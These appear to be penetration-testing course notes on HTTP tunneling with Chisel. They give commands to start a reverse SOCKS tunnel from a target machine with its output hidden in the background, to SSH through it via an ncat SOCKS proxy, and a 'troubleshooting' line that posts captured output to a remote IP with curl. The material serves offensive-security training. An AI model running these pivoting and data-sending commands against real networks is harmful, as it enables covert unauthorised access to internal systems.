## Section 1 HTTP Tunneling Theory and Practice
### 16.1.2 HTTP Tunneling with Chisel
- start a chisel server with 
```
chisel server --port 8080 --reverse
```
- Start a chisel client with 
```
chisel client <SERVER_IP>:8080 R:socks > /dev/null 2>&1 &
```
- You can also run a chisel server on your client and use ncat to connect with the following 
```
chisel server --port 8080 --reverse
```
- Start a chisel client on the target machine
- Find the local proxy with 
```
ss -ntplu
```
- Use the following command with the local proxy port to connect 
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:<LOCAL_PORT_PROXY> %h %p' <TARGET_USER>@<TARGET_IP>
```
- Chisel troubleshooting example if output isn't showing
```
chisel client<IP>:8080 R:socks &>/tmp/output; curl --data @/tmp/output http://<IP>:8080/
```

## Section 2

## Exercises To-Do

- [ ] 2.1.1 (page 20)